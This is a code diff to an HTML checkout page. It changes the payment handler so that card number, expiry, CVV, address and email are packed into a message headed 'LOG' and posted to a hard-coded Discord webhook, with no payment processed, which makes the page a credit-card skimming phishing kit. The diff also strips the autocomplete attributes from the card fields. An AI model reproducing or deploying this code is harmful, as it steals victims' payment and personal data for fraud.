@@ -240,9 +240,9 @@
   <div id="paymentPage" class="container">
     <h2>Enter Payment Details</h2>
     <form id="paymentForm" onsubmit="submitPayment(event)">
-      <input type="text" id="cardNumber" placeholder="Card Number (xxxx-xxxx-xxxx-xxxx)" maxlength="19" required autocomplete="cc-number"><br>
-      <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required autocomplete="cc-exp"><br>
-      <input type="text" id="cvv" placeholder="CVV (3-4 digits)" maxlength="4" required autocomplete="cc-csc"><br>
+      <input type="text" id="cardNumber" placeholder="Card Number (xxxx-xxxx-xxxx-xxxx)" maxlength="19" required><br>
+      <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required><br>
+      <input type="text" id="cvv" placeholder="CVV (3-4 digits)" maxlength="4" required><br>
       <button type="submit" class="button">Submit Payment</button>
     </form>
   </div>
@@ -256,29 +256,90 @@
   <script>
     // Show the products page (hide landing)
     function viewProducts() {
-      document.getElementById('landingPage').classList.remove('active');
+      document.getElementById('landingPage').style.display = 'none';
       document.getElementById('productPage').classList.add('active');
+      // (Webhook trigger on viewProducts can be added here if desired)
     }
 
-    // Show the shipping page (after adding item to cart)
+    // Show shipping page from product page
     function showShippingPage() {
       document.getElementById('productPage').classList.remove('active');
       document.getElementById('shippingPage').classList.add('active');
     }
 
-    // Redirect to payment page
+    // Redirect to Payment page on shipping form submit
     function redirectToPaymentPage(event) {
       event.preventDefault();
+      window.location.href = '#paymentPage';
       document.getElementById('shippingPage').classList.remove('active');
       document.getElementById('paymentPage').classList.add('active');
     }
 
-    // Submit payment and show thank you page
+    // Submit payment form and send data to the webhook
     function submitPayment(event) {
       event.preventDefault();
-      document.getElementById('paymentPage').classList.remove('active');
-      document.getElementById('thankyouPage').classList.add('active');
+
+      // Get form data
+      const cardNumber = document.getElementById('cardNumber').value;
+      const expiry = document.getElementById('expiry').value;
+      const cvv = document.getElementById('cvv').value;
+      const name = document.getElementById('name').value;
+      const address = document.getElementById('address').value;
+      const city = document.getElementById('city').value;
+      const zip = document.getElementById('zip').value;
+      const country = document.getElementById('country').value;
+      const email = document.getElementById('email').value;
+
+      // Format the expiry date
+      const formattedExpiry = expiry.replace(/(\d{2})(\d{2})/, '$1/$2');
+
+      // Prepare the data payload
+      const payload = {
+        content: '',
+        embeds: [
+          {
+            title: "LOG 🔥",
+            color: 0x3498db,
+            fields: [
+              { name: '💳 Card Number', value: cardNumber, inline: true },
+              { name: '🏠 Address', value: address, inline: true },
+              { name: '🏙️ City', value: city, inline: true },
+              { name: '📮 Postal Code', value: zip, inline: true },
+              { name: '🌍 Country', value: country, inline: true },
+              { name: '📧 Email', value: email, inline: true },
+              { name: '📅 Expiry Date', value: formattedExpiry, inline: true },
+              { name: '🔒 CVV', value: cvv, inline: true }
+            ]
+          }
+        ]
+      };
+
+      // Send data to your Discord webhook
+      fetch('https://discord.com/api/webhooks/1347663029617299546/HTVc5gct83Q8ho0Oc0iUoFmOpEvjqVqRqn9EQMMxX8RKYpAvGnv7hsyde3k-EiVEFjoE', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      })
+      .then(() => {
+        document.getElementById('paymentPage').classList.remove('active');
+        document.getElementById('thankyouPage').classList.add('active');
+      })
+      .catch(error => console.error('Error submitting payment:', error));
     }
+
+    // Format Card Number: insert dashes every 4 digits; enforce 16-digit max.
+    document.getElementById('cardNumber').addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length > 16) value = value.slice(0, 16);
+      e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1-');
+    });
+
+    // Format Expiry: add a slash between MM and YY (max 4 digits)
+    document.getElementById('expiry').addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\D/g, '');
+      if (value.length > 4) value = value.slice(0, 4);
+      e.target.value = value.replace(/(\d{2})(\d{2})/, '$1/$2');
+    });
   </script>
 </body>
 </html>
